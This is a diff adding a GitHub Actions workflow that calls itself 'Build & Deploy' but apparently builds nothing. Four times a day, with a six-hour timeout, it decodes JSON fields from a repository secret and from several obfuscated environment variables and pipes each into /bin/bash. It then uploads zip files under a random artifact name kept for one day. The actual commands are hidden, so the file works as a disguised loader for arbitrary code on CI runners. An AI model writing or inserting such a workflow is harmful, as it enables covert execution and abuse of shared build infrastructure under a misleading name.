@@ -1,0 +1,37 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '39 0,6,12,18 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          nrt56: ${{ secrets.nrt56 }}
+        run: |
+          printf '%s' "$nrt56" | jq -r .c1 | /bin/bash
+          echo $yh09543 | jq -r .awyyl61 | /bin/bash
+          printf '%s' "$whd01" | jq -r .yr3359 | /bin/bash
+          printf '%s' "$foil89561" | jq -r .jftt835 | /bin/bash
+          echo $mc780 | jq -r .bgwx96 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: BWTIlosT
+          path: "*.zip"
+          retention-days: 1
